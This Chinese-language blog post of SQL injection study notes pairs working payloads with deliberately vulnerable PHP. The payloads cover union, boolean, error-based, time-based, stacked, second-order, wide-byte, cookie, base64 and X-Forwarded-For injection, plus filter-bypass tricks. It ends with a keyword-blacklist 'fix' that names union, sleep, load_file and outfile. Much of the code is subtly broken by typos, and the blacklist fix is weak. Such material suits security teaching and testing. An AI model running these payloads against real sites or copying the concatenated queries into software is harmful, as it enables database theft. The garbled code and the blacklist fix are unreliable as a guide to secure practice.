---
title: SQL注入攻击实战
date: 2024-01-01 12:58:09
tags: SQL
mathjax: true
---

#  SQL注入攻击实战

## 攻击前准备

### 存在注入判断

```
id=1'
id=1 and 1=1
```

### information_schema

* information_schema
    * schemata
        * schema_name 数据库库名
    * tables
        * table_schema 各表对应的数据库名
        * table_name 表名
    * columns
        * table_schema
        * table_name
        * column_name 列名

## Union联合注入攻击

```
id=1
id=1'
id=1 and 1=1
id=1 and 1=2
id=1 order by 3
id=1 order by 4
id=1 union select 1,2,3
id=-1 union select 1,2,3
id=-1 union select 1,database(),3
id=-1 union select 1,(select table_name from information_schema.tables where table_schema='sql' limit 0,1),3
id=-1 union select 1,(select table_name from information_schema.tables where table_schema='sql' limit 1,1),3
id=-1 union select 1,(select column_name from information_schema.columns where table_schema='sql' and table_name='emails' limit 0,1),3
id=-1 union select 1,(select column_name from information_schema.columns where table_schema='sql' and table_name='emails' limit 1,1),3
id=-1 union select 1,(select email_id from sql.emails limit 0,1),3
```

代码分析：

```php
<?php
    $con=mysqli_connect("localhost","root","123456","test");
    if(mysqli_connect_errno()){
        echo "连接失败".mysqli_connect_error();
    }
    $id=$_GET['id'];
    $result=mysqli_query($con,"select * from users where `id`=".$id);
    $row=mysqli_fetch_array($result);
    echo $row['username'].":".$row['address'];
    echo "<br>";
?>
```

## Boolean布尔注入攻击

```
id=1
id=1'
id=1' and length(database())>=1--+
id=1' and length(database())>=3--+
id=1' and length(database())>=4--+
id=1' and substr(database(),1,1)='t'--+
id=1' and ord(substr(database(),1,1))=115--+
id=1' and substr((select table_name from information_schema.tables where table_schema='sql' limit 0,1),1,1)='e'--+
```

代码分析：

```php
<?php
    $con=mysqli_connect("localhost","root","123456","test");
    if(mysqli_connect_errno()){
        echo "连接失败".mysqli_connect_error();
    }
    $id=$_GET['id'];
    if(preg_match("/union|sleep|benchmark/i",$id)){
        exit("no");
    }
    $result=mysqli_query($con,"select * from users where `id`='".$id."'");
    $row=mysqli_fetch_array($result);
    if($row){
        exit("yes");
    }else{
        exit("no");
    }
?>
```

## 报错注入攻击

```
username=1'
username=1' and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+
username=1' and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+
username=1' and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e),1)--+
username=1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='test' limit 0,1),0x7e),1)--+
```

代码分析：

```php
<?php
    $con=mysqli_connect("localhost","root","123456","test");
    if(mysqli_connect_errno()){
        echo "连接失败".mysqli_connect_error();
    }
    $username=$_GET['username'];
    if($result=mysqli_query($con,"select * from users where `username`='".$username."'")){
        echo "ok";
    }else{
        echo mysqli_error($con);
    }
?>
```

## 时间注入攻击

```
id=1' and if(length(database())>1,sleep(5),1)--+
id=1' and if(length(database())>10,sleep(5),1)--+
id=1' and if(substr(database(),1,1)='s',sleep(5),1)--+
```

代码分析：

```php
<?php
    $con=mysqli_connect("localhost","root","123456","test");
    if(mysqli_connect_errno()){
        echo "连接失败".mysqli_connect_error();
    }
    $id=$_GET['id'];
    if(preg_match("/union/i",$id)){
        exit("<html><body>no</body></html>");
    }
    $result=mysqli_query($con,"select * from users where `id`='".$id."'");
    $row=mysqli_fetch_array($result);
    if($row){
        exit("<html><body>yes</body></html>");
    }else{
        exit("<html><body>no</body></html>");
    }
?>
```

## 堆叠查询注入攻击

```
id=1';select if(substr(user(),1,1)='r',sleep(3),1)%23
id=1';select if(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)='a',sleep(3),1)%23
```

代码分析：

```php
<?php
    try{
        $conn=new PDO("mysql:host=localhost;dbname=test","root","123456");
        $conn->setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_EXCEPTION);
        $stmt=$conn->query("select * from users where `id`='".$_GET['id']."'");
        $result=$stmt0>setFetchMode(PDO::FETCH_ASSOC);
        foreach($stmt->fetchAll() as $k=>$v){
            foreach($v as $key=>$value){
                echo $value;
            }
        }
        $dsn=null;
    }
    catch(PDOException $e){
        echo "error";
    }
    $conn=null;
?>
```

## 二次注入攻击

```
1.php?username=test' #1.php中注册用户名test'
2.php?id=21 #访问后因单引号引发报错

1.php?username=test' order by 1%23
2.php?id=32

1.php?username=test' order by 10%23
2.php?id=33

1.php?username=test' union select 1,2,3%23
2.php?id=39

1.php?username=test' union select 1,user(),3%23
2.php?id=40
```

代码分析：

```php
<!--1.php-->
<?php
    $con=mysqli_connect("localhost","root","root","sql");
    if(mysqli_connect_errno()){
        echo "连接失败".mysqli_connect_error();
    }
    $username=$_GET['username'];
    $password=$_GET['password'];
    $result=mysqli_query($con,"insert into users(`username`,`password`) values ('".addslashes($username)."','",md5($password)."')");
    echo "新id为：".mysqli_insert_id($con);
?>

<!--2.php-->
<?php
    $con=mysqli_connect("localhost","root","root","sql");
    if(mysqli_connect_errno()){
        echo "连接失败".mysqli_connect_error();
    }
    $id=intval($_GET['id']);
    $result=mysqli_query($con,"select * from users where `id`=".$id);
    $row=mysqli_fetch_array($result);
    $usrename=$row['username'];
    $result2=mysqli_query($con,"select * from person where `username`='".$username."'");
    if($row2=mysqli_fetch_array($result2)){
        echo $row2['username'].":".row2['money'];
    }else{
        echo mysqli_error($con);
    }
?>
```

## 宽字节注入攻击

```
id=1' #'被加了转义符 %df%5c即%df'在GBK编码中为連
id=1%df'
id=1%df' %23
id=1%df' and 1=1%23
id=1%df' and 1=2%23
id=1%df' order by 3%23
id=-1%df' union select 1,2,3%23
id=-1%df' union select 1,user(),3%23
id=-1%df' union select 1,(select table_name from information_schema.tables where table_schema=(select database())limit 0,1),3%23 #直接'sql'会被转义
id=-1%df' union select 1,(select column_name from information_schema.columns where table_schema=(select database()) and table_name=(select database())limit 0,1),3%23
```

代码分析：

```php
<?php
    $conn=mysql_connect('localhost','root','123456') or die('bad!');
    mysql_select_db('test',$conn) OR emMsg("数据库连接失败");
    myusql_query("set names 'gbk",$conn);
    $id=addslashes($_GET['id']);
    $sql="select * from users where id='$id' limit 0,1";
    $result=mysql_query($sql,$conn) or die(msql_error());
    $row=mysql_fetch_array($result);
    if($row){
        echo $row['username'].":".$row['address'];
    }else{
        print_r(mysql_error());
    }
?>
</font>
<?php
    echo "<br>The Query String is:".$sql."<br>";
?>
```

## Cookie注入攻击

```
id=1 and 1=1
id=1 and 1=2
```

代码分析：

```php
<?php
    $id=$_COOKIE['id'];
    $value="1";
    setcookie("id",$value);
    $con=mysqli_connect("localhost","root","root","sql");
    if(mysqli_connect_errno()){
        echo "连接失败".mysqli_connect_error();
    }
    $result=mysqli_query($con,"select * from users where `id`=".$id);
    if(!$result){
        printf("Error:%s\n",mysqli_error($con));
        exit();
    }
    $row=mysqli_fetch_array($result);
    echo $row['username'].":".$row['password'];
    echo "<br>";
?>
```

## Base64注入攻击

代码分析：

```php
<?php
    $id=base64_decode($_GET['id']);
    $conn=mysql_connect("localhost","root","root");
    mysql_select_db("sql",$conn);
    $sql="select * from users where id=$id";
    $result=mysql_query($sql);
    while($row=mysql_fetch_array($result)){
        echo "ID:".$row['id']."<br>";
        echo "user:".$row['username']."<br>";
        echo "pass:".$row['password']."<br>";
        echo "<hr>";
    }
    mysql_close($conn);
    echo "now use".$sql."<hr>";
?>
```

## XFF注入攻击

```
X-Forwarded-for:127.0.0.1'
X-Forwarded-for:127.0.0.1' and 1=1#
X-Forwarded-for:127.0.0.1' and 1=2#
X-Forwarded-for:127.0.0.1' union select 1,2,3,4#
```

代码分析：

```php
<?php
    $con=mysqli_connect("localhost","root","root","sql");
    if(mysqli_connect_errno()){
        echo "连接失败".mysqli_connect_error();
    }
    if(getenv('HTTP_CLIENT_IP')){
        $ip=getenv('HTTP_CLIENT_IP')
    }elseif(getenv('HTTP_X_FORWARDED_FOR')){
        $ip=getenv('HTTP_X_FORWARDED_FOR')
    }elseif(getenv('REMOTE_ADDR')){
        $ip=getenv('REMOTE_ADDR');
    }else{
        $ip=$HTTP_SERVER_VARS['REMOTE_aDDR'];
    }
    $result=mysqli_query($con,"select * from user where `ip`='$ip'");
    if(!$result){
        printf("Error:%s\n",mysqli_error($con));
        exit();
    }
    $row=mysqli_fetch_array($result);
    echo $row['username'].":".$row['password'];
    echo "<br>";
?>
```

## 常用绕过技巧

```
#大小写绕过
id=1 And 1=1
id=1 And 1=2
id=1 Order by 3

#双写绕过
id=1 anandd 1=1
id=1 oorrder by 3

#编码绕过-两次URL编码
id=1 %25%36%31%25%36%65%25%36%34 1=1
id=1 %25%36%31%25%36%65%25%36%34 1=2

#内联注入绕过
id=1 /*1and*/ 1=1
id=1 /*1and*/ 1=2
```

## SQL注入修复

```php
<?php
    function CheckSql($db_string,$querytype='select'){
        global $cfg_cookie_encode;
        $clean='';
        $error='';
        $old_pos=0;
        $pos=-1;
        $log_file=DEDEINC.'/../data/'.md5($cfg_cookie_encode).'_safe.txt';
        $userIP=GetIP();
        $getUrl=GetCurUrl();
        if($querytype='select'){
            $notallow1="[^0-9a-z@\._-]{1,}(union|sleep|benchmark|load_file|outfile)[^0-9a-z@\.-]{1,2}";
            if(preg_match("/".$notallow1."/i",$db_string)){
                fputs(fopen($log_file,'a+'),"$userIP||$getUrl||$db_string||SelectBreak\r\n");
                exit("<font size='5' color='red'>Safe Alert:Request Error step 1 !</font>");
            }
        }
        while(TRUE){
            $pos=strpos($db_string,'\'',$pos+1);
            if($pos==FALSE){
                break;
            }
            $clean.=stubstr($db_string,$old_pos,$pos-$old_pos);
            while(TRUE){
                $pos1=strpos($db_string,'\'',$pos+1);
                $pos2=strpos($db_string,'\\',$pos+1);
                if($pos1==FALSE){
                    break;
                }
                elseif($pos2==FALSE||$pos2>$pos1){
                    $pos=$pos1;
                    break;
                }
                $pos=$pos2+1;
            }
            $clean.='$s$';
            $old_pos=$pos+1;
        }
        $clean.=substr($db_string,$old_pos);
        $clean=trim(strtolower(preg_replace(array('~\s+~s'),array(' '),$clean)));
        if(strpos($clean,'union')!=FALSE&&preg_match('~(^|[^a-z])union($|[^[a-z])~s',$clean)!=0){
            $fail=TRUE;
            $error="union detect";
        }
        elseif(strpos($clean,'/*')>2||strpos($clean,'--')!=FALSE||strpos($clean,'#')!=FALSE){
            $fail=TRUE;
            $error="comment detect";
        }
        elseif(strpos($clean,'sleep')!=FALSE&&preg_match('~(^|[^a-z])sleep($|[^[a-z])~s',$clean)!=0){
            $fail=TRUE:
            $error="slow down detect";
        }
        elseif(strpos($clean,'benchmark')!=FALSE&&preg_match('~(^|[^a-z])benchmark($|[^[a-z])~s',$clean)!=0){
            $fail=TRUE;
            $error="slow down detect";
        }
        elseif(strpos($clean,'load_file')!=FALSE&&preg_match('~(^|[^a-z])load_file($|[^[a-z])~s',$clean)!=0){
            $fail=TRUE;
            $error="file fun detect";
        }
        elseif(strpos($clean,'into outfile')!=FALSE&&preg_match('~(^|[^a-z])into\s+outfile($|[^[a-z])~s',$clean)!=0){
            $fail=TRUE;
            $error="file fun detect";
        }
        elseif(preg_match('~\([^)]*?select~s',$clean)!=0){
            $fail=TRUE;
            $error="sub select detect";
        }
        if(!empty($fail)){
            fputs(fopen($log_file,'a+'),"$userIP||$getUrl||$db_string||$error\r\n");
            exit("<font size='5' color='red'>Safe Alert: Request Error step 2!</font>");
        }else{
            return $db_string;
        }
    }
?>
```

